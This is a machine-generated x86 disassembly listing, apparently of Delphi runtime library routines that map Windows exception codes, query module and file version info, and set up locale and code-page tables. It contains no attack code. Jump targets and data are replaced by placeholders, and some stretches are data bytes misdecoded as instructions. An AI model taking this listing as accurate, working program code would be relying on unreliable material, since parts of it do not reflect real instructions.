mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_403f74
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_40b8a0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40b8fa
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_408d6c
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_403f74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b901
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
add esp 0xfffffff0
call sub_4034f4
sub_40b901
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_40b920
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea edx [ edi + 0x4 ]
mov eax esi
call sub_405c50
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_40b95c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40b9c8
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_405c50
mov eax [ ebp - 0x8 ]
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_408d6c
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_403f74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b9cf
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f44
retn
add esp 0xfffffff0
call sub_4034f4
sub_40b9cf
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_40ba1c
push ebx
push esi
add esp 0xfffffff8
xor ebx ebx
call sub_4028b8
mov esi eax
jmp r-xdata
cmp ebx 0x6
jg r-xdata
cmp ebx 0x6
jg r-xdata
cmp esi [ ebx * 8 + rw-data ]
jne r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b95c
mov ecx [ ebx * 8 + rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b864
jmp r-xdata
inc ebx
mov [ eax + 0xc ] esi
pop ecx
pop edx
pop esi
pop ebx
retn
sub_40ba7c
cmp [ edx + 0xa0e0040 ] 0x54
inc ebp
js r-xdata
jle r-xdata
jo r-xdata
[ ebx - 0x3d ]
mov eax eax
loopne r-xdata
push edx
je r-xdata
pop ebp
cld
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40bb8c
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov edx [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
pop es
arpl [ gs : eax ] cx
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
push ebx
mov ebx edx
mov edx eax
dec dl
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c50
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_403fb8
jmp r-xdata
push ebx
mov eax edx
jmp sub_40395c
mov edx [ rw-data ]
jmp r-xdata
dec edx
sub dl 0x16
jb r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0xb
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8a0
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bb93
lea eax [ ebp - 0x20 ]
call sub_403f20
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
and eax 0xff
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40b864
mov edx eax
jmp r-xdata
jmp r-xdata
call sub_40ba1c
mov edx eax
sub_40baf0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40bb8c
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c50
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_403fb8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0xb
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8a0
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bb93
lea eax [ ebp - 0x20 ]
call sub_403f20
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
sub_40bbe0
mov eax [ eax ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0x6
retn
cmp eax 0xc000008e
jg r-xdata
mov al 0xe
retn
sub eax 0x3d
je r-xdata
mov al 0xc
retn
sub eax 0xc0000093
je r-xdata
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd
retn
jmp r-xdata
mov al 0x9
retn
dec eax
je r-xdata
je r-xdata
mov al 0x7
retn
sub eax 0xc0000005
je r-xdata
mov al 0x16
retn
mov al 0x3
retn
dec eax
je r-xdata
mov al 0x8
retn
jmp r-xdata
mov al 0xb
retn
sub eax 0x87
je r-xdata
mov al 0x5
retn
jmp r-xdata
mov al 0x4
retn
dec eax
je r-xdata
jmp r-xdata
sub_40bc78
push ebp
mov ebp esp
add esp 0xfffffe90
push ebx
push esi
xor eax eax
mov [ ebp - 0x170 ] eax
mov [ ebp - 0x14c ] eax
mov [ ebp - 0x154 ] eax
mov [ ebp - 0x150 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40be33
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c50
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c50
jmp r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x16c ] eax
mov [ ebp - 0x168 ] 0x5
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x164 ] eax
mov [ ebp - 0x160 ] 0xb
mov [ ebp - 0x15c ] esi
mov [ ebp - 0x158 ] 0x5
lea eax [ ebp - 0x16c ]
push eax
push 0x2
lea edx [ ebp - 0x170 ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0x170 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8a0
mov ebx eax
push 0x105
lea eax [ ebp - 0x125 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetModuleFileNameA
test eax eax
je r-xdata
mov esi [ ebx + 0x18 ]
push 0x1c
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call VirtualQuery
cmp [ ebp - 0x10 ] 0x1000
jne r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x144 ] 0x5
lea eax [ ebp - 0x150 ]
lea edx [ ebp - 0x125 ]
mov ecx 0x105
call sub_404190
mov eax [ ebp - 0x150 ]
lea edx [ ebp - 0x14c ]
call sub_408574
mov eax [ ebp - 0x14c ]
mov [ ebp - 0x140 ] eax
mov [ ebp - 0x13c ] 0xb
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x138 ] eax
mov [ ebp - 0x134 ] 0xb
mov [ ebp - 0x130 ] esi
mov [ ebp - 0x12c ] 0x5
lea eax [ ebp - 0x148 ]
push eax
push 0x3
lea edx [ ebp - 0x154 ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0x154 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8a0
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40be3a
lea eax [ ebp - 0x170 ]
call sub_403f20
lea eax [ ebp - 0x154 ]
mov edx 0x3
call sub_403f44
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
sub_40be44
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40beff
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40bbe0
and eax 0xff
mov edx eax
add edx 0xfffffffd
sub edx 0x8
jb r-xdata
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40b864
mov ebx eax
jmp r-xdata
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
push ebp
call sub_40bc78
pop ecx
mov ebx eax
jmp r-xdata
dec edx
sub edx 0xa
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bf06
lea eax [ ebp - 0x10 ]
call sub_403f20
retn
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8a0
mov ebx eax
sub_40bf20
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b920
mov [ rw-data ] eax
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b920
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_40bf10
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ rw-data ]
mov [ eax ] sub_40bc60
mov eax [ rw-data ]
mov [ eax ] sub_40be44
mov eax sub_40bbac
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40bbc8
mov edx [ rw-data ]
mov [ edx ] eax
retn
sub_40bfa4
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx - 0x8 ]
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
retn
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
call sub_403190
xor eax eax
mov [ rw-data ] eax
sub_40c024
add esp 0xffffff6c
mov [ esp ] 0x94
push esp
call GetVersionExA
test eax eax
je r-xdata
add esp 0x94
retn
mov eax [ esp + 0x10 ]
mov [ rw-data ] eax
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
mov eax [ esp + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ esp + 0xc ]
mov [ rw-data ] eax
mov eax [ esp + 0xc ]
and eax 0xffff
mov [ rw-data ] eax
jmp r-xdata
mov eax rw-data
lea edx [ esp + 0x14 ]
mov ecx 0x80
call sub_404190
sub_40c0b4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_40c18a
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_403fb8
lea eax [ ebp - 0x8 ]
call j_sub_4043ec#2
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4043e0
push eax
call GetFileVersionInfoSizeA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c191
lea eax [ ebp - 0x8 ]
call sub_403f20
retn
mov eax ebx
call sub_4026dc
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_40c16d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
push ebx
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4043e0
push eax
call GetFileVersionInfoA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_4026fc
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
call VerQueryValueA
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
sub_40c1a0
push esi
push edi
mov edi edx
xor edx edx
test eax eax
je r-xdata
mov eax edx
pop edi
pop esi
retn
cmp [ eax + edi ] 0x0
je r-xdata
test edi edi
jne r-xdata
mov esi edi
dec esi
jmp r-xdata
mov al [ eax ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
test esi esi
jl r-xdata
mov dl 0x1
jmp r-xdata
mov ecx edi
sub ecx esi
and ecx 0x80000001
jns r-xdata
mov cl [ eax + esi ]
and ecx 0xff
bt [ rw-data ] ecx
jb r-xdata
test ecx ecx
jne r-xdata
dec ecx
or ecx 0xfffffffe
inc ecx
dec esi
mov al [ eax + edi ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov dl 0x2
jmp r-xdata
mov dl 0x1
sub_40c218
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4043e0
mov edx esi
dec edx
call sub_40c1a0
sub_40c254
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4041e0
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_40c27c
pop esi
pop ebx
retn
mov eax ebx
call sub_4041e0
mov esi eax
sub_40c27c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor edi edi
test esi esi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4041e0
cmp esi eax
jg r-xdata
mov edi esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
xor edi edi
cmp esi eax
jl r-xdata
mov dl [ ebx + eax - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
inc eax
mov edx eax
mov eax ebx
call sub_40c48c
jmp r-xdata
inc edi
cmp esi eax
jge r-xdata
sub_40c2d4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax edi
call sub_4041e0
mov [ ebp - 0xc ] eax
mov esi 0x1
mov ebx 0x1
jmp r-xdata
cmp ebx [ ebp - 0xc ]
jge r-xdata
cmp esi [ ebp - 0x4 ]
jne r-xdata
cmp esi [ ebp - 0x4 ]
jl r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] esi
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp ebx [ ebp - 0xc ]
jge r-xdata
inc esi
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc ebx
mov edx ebx
mov eax edi
call sub_40c48c
mov ebx eax
jmp r-xdata
mov edx ebx
mov eax edi
call sub_40c48c
dec eax
mov ebx eax
sub_40c364
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_4041e0
cmp ebx eax
jg r-xdata
cmp ebx 0x1
jle r-xdata
mov [ esp ] ebx
cmp [ rw-data ] 0x0
je r-xdata
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
dec edx
mov eax esi
call sub_40c2d4
dec ebx
cmp ebx [ esp + 0x4 ]
jg r-xdata
xor eax eax
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_4041e0
cmp eax [ esp ]
jg r-xdata
inc [ esp ]
jmp r-xdata
sub_40c3c8
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_4041e0
cmp ebx eax
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax esi
call sub_4041e0
mov ebx eax
mov [ esp ] ebx
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
mov eax esi
call sub_40c2d4
mov eax esi
call sub_4041e0
cmp eax [ esp ]
jge r-xdata
mov eax esi
call sub_4041e0
mov [ esp ] eax
jmp r-xdata
sub_40c450
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x1
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ ebx + esi - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax ebx
call sub_4043e0
add eax esi
dec eax
call sub_40c428
sub_40c48c
push ebx
push esi
mov ebx edx
mov esi eax
lea eax [ ebx + 0x1 ]
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax esi
call sub_4043e0
add eax ebx
dec eax
call sub_40c428
add eax ebx
sub_40c4c8
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
xor edi edi
mov eax ebx
call sub_4043e0
push eax
mov eax esi
call sub_4043e0
mov ebp eax
mov eax ebp
pop edx
call sub_40c58c
mov ebx eax
test ebx ebx
je r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi ebx
sub edi ebp
inc edi
sub_40c500
push ebx
push esi
push edi
push ebp
mov edi edx
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_407e78
mov eax esi
call sub_4041e0
mov ebp eax
mov eax edi
mov edx ebp
call sub_40456c
mov ebx 0x1
cmp ebp ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call j_sub_4043ec
mov dl [ esi + ebx - 0x1 ]
mov [ eax + ebx - 0x1 ] dl
mov al [ esi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ edi ]
mov al [ eax + ebx - 0x1 ]
add al 0xbf
sub al 0x1a
jae r-xdata
inc ebx
mov eax edi
call j_sub_4043ec
mov dl [ esi + ebx - 0x1 ]
mov [ eax + ebx - 0x1 ] dl
jmp r-xdata
inc ebx
cmp ebp ebx
jge r-xdata
mov eax edi
call j_sub_4043ec
add [ eax + ebx - 0x1 ] 0x20
jmp r-xdata
sub_40c58c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
test ebp ebp
je r-xdata
cmp [ ebp ] 0x0
je r-xdata
mov eax esi
call sub_4086a4
mov [ esp ] eax
mov eax ebp
call sub_4086a4
mov edi eax
mov edx ebp
mov eax esi
call sub_40883c
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
xor ebx ebx
mov eax ebx
sub eax esi
mov edx [ esp ]
sub edx eax
cmp edi edx
jbe r-xdata
mov edx ebx
sub edx esi
mov eax esi
call sub_40c23c
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x2
je r-xdata
cmp [ esp + 0x4 ] 0x1
jne r-xdata
push edi
push ebp
push edi
push ebx
push 0x0
push 0x400
call CompareStringA
cmp eax 0x2
je r-xdata
inc ebx
mov edx ebp
mov eax ebx
call sub_40883c
mov ebx eax
inc ebx
sub_40c62c
push ebx
push esi
mov ebx edx
mov edx ebx
call sub_40c654
mov esi eax
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov esi eax
inc eax
mov edx ebx
call sub_40c654
test eax eax
jne r-xdata
sub_40c654
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_408828
mov edi eax
test edi edi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov edx edi
sub edx esi
mov eax esi
call sub_40c23c
sub al 0x1
jb r-xdata
je r-xdata
inc edi
jmp r-xdata
inc edi
mov edx ebx
mov eax edi
call sub_408828
mov edi eax
test edi edi
jne r-xdata
sub_40c694
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
xor edx edx
push ebp
push sub_40c6f8
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0x7 ]
push edx
push 0x1004
push eax
call GetLocaleInfoA
lea eax [ ebp - 0xc ]
lea edx [ ebp - 0x7 ]
mov ecx 0x7
call sub_404190
mov eax [ ebp - 0xc ]
push eax
call GetACP
mov edx eax
pop eax
call sub_4081cc
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c6ff
lea eax [ ebp - 0xc ]
call sub_403f20
retn
sub_40c708
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xffffffec
push edi
mov eax [ rw-data ]
call sub_40c694
push eax
call GetCPInfo
xor esi esi
jmp r-xdata
cmp esi 0xc
jge r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov al [ edi + esi + 0x6 ]
or al [ edi + esi + 0x7 ]
jne r-xdata
mov al [ edi + esi + 0x6 ]
mov bl [ edi + esi + 0x7 ]
sub bl al
jb r-xdata
add esi 0x2
inc ebx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
and eax 0xff
bts [ rw-data ] eax
inc [ ebp - 0x1 ]
dec bl
jne r-xdata
sub_40c780
push ebp
mov ebp esp
add esp 0xfffffe68
push ebx
push esi
push edi
mov [ rw-data ] 0x409
mov [ rw-data ] 0x9
mov [ rw-data ] 0x1
call GetThreadLocale
test eax eax
je r-xdata
test ax ax
je r-xdata
mov [ rw-data ] eax
mov esi r-xdata
mov edi rw-data
mov ecx 0x8
[ edi ] [ esi ]
cmp [ rw-data ] 0x2
jne r-xdata
mov edx eax
and dx 0x3ff
movzx edx dx
mov [ rw-data ] edx
movzx eax ax
shr eax 0xa
mov [ rw-data ] eax
push 0x4a
call GetSystemMetrics
test eax eax
setne al
mov [ rw-data ] al
push 0x2a
call GetSystemMetrics
test eax eax
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
call sub_40c768
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_40c708
pop ecx
push ebp
call sub_40c708
pop ecx
mov eax rw-data
mov edx r-xdata
mov cl 0x20
call sub_402cc8
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
jmp r-xdata
mov eax 0x80
lea edx [ ebp - 0x94 ]
mov [ rw-data ] 0x0
jmp r-xdata
mov [ edx ] al
inc eax
inc edx
cmp eax 0x100
jne r-xdata
lea eax [ ebp - 0x94 ]
lea edx [ ebp - 0x196 ]
push edx
push 0x80
push eax
push 0x2
mov eax [ rw-data ]
push eax
call GetStringTypeExA
mov eax 0x80
lea edx [ ebp - 0x196 ]
add edx 0x2
dec eax
jne r-xdata
cmp [ edx ] 0x2
sete cl
mov [ rw-data ] cl
test cl cl
jne r-xdata
jmp r-xdata
sub_40c8f4
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
xor eax eax
push ebp
push sub_40cbbf
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_40c780
call sub_40b158
cmp [ rw-data ] 0x0
je r-xdata
call GetThreadLocale
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
xor ecx ecx
mov edx 0x14
mov eax ebx
call sub_40b0a8
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_403f74
lea eax [ ebp - 0x14 ]
push eax
mov ecx r-xdata
mov edx 0x1b
mov eax ebx
call sub_40b0a8
mov eax [ ebp - 0x14 ]
xor edx edx
call sub_4081cc
mov [ rw-data ] al
lea eax [ ebp - 0x18 ]
push eax
mov ecx r-xdata
mov edx 0x1c
mov eax ebx
call sub_40b0a8
mov eax [ ebp - 0x18 ]
xor edx edx
call sub_4081cc
mov [ rw-data ] al
mov cl 0x2c
mov edx 0xf
mov eax ebx
call sub_40b0f4
mov [ rw-data ] al
mov cl 0x2e
mov edx 0xe
mov eax ebx
call sub_40b0f4
mov [ rw-data ] al
lea eax [ ebp - 0x1c ]
push eax
mov ecx r-xdata
mov edx 0x19
mov eax ebx
call sub_40b0a8
mov eax [ ebp - 0x1c ]
xor edx edx
call sub_4081cc
mov [ rw-data ] al
mov cl 0x2f
mov edx 0x1d
mov eax ebx
call sub_40b0f4
mov [ rw-data ] al
lea eax [ ebp - 0x24 ]
push eax
mov ecx r-xdata
mov edx 0x1f
mov eax ebx
call sub_40b0a8
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x20 ]
call sub_40b3e0
mov edx [ ebp - 0x20 ]
mov eax rw-data
call sub_403f74
lea eax [ ebp - 0x2c ]
push eax
mov ecx r-xdata
mov edx 0x20
mov eax ebx
call sub_40b0a8
mov eax [ ebp - 0x2c ]
lea edx [ ebp - 0x28 ]
call sub_40b3e0
mov edx [ ebp - 0x28 ]
mov eax rw-data
call sub_403f74
mov cl 0x3a
mov edx 0x1e
mov eax ebx
call sub_40b0f4
mov [ rw-data ] al
lea eax [ ebp - 0x30 ]
push eax
mov ecx r-xdata
mov edx 0x28
mov eax ebx
call sub_40b0a8
mov edx [ ebp - 0x30 ]
mov eax rw-data
call sub_403f74
lea eax [ ebp - 0x34 ]
push eax
mov ecx r-xdata
mov edx 0x29
mov eax ebx
call sub_40b0a8
mov edx [ ebp - 0x34 ]
mov eax rw-data
call sub_403f74
lea eax [ ebp - 0x8 ]
call sub_403f20
lea eax [ ebp - 0xc ]
call sub_403f20
lea eax [ ebp - 0x38 ]
push eax
mov ecx r-xdata
mov edx 0x25
mov eax ebx
call sub_40b0a8
mov eax [ ebp - 0x38 ]
xor edx edx
call sub_4081cc
test eax eax
jne r-xdata
call sub_40b330
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403fb8
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403fb8
jmp r-xdata
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_4042a0
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_4042a0
mov cl 0x2c
mov edx 0xc
mov eax ebx
call sub_40b0f4
mov [ rw-data ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cbc6
lea eax [ ebp - 0x40 ]
mov edx 0x10
call sub_403f44
retn
lea eax [ ebp - 0x40 ]
push eax
mov ecx r-xdata
mov edx 0x1005
mov eax ebx
